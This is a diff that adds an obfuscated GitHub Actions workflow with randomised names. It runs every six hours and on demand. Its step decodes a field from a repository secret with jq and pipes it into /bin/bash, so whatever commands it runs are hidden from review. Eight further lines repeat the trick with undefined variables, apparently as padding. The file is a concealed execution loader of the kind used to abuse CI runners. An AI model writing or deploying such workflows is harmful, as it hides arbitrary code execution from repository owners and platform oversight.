@@ -1,0 +1,25 @@
+name: liangliupin6719
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liangliupin6719
+        env:
+          ybr4: ${{ secrets.ybr4 }}
+        run: |
+          echo $ybr4 | jq -r .etflg76 | /bin/bash
+          echo $b9721 | jq -r .eeuil86508 | /bin/bash
+          echo $p60328 | jq -r .df29 | /bin/bash
+          echo $pb3579 | jq -r .zr5 | /bin/bash
+          echo $dxah862 | jq -r .fuue30 | /bin/bash
+          echo $c92545 | jq -r .rjrdj308 | /bin/bash
+          echo $rjgvg7709 | jq -r .zx0362 | /bin/bash
+          echo $xb033 | jq -r .dfpn4 | /bin/bash
+          echo $fcur8486 | jq -r .lfcrz50427 | /bin/bash
+
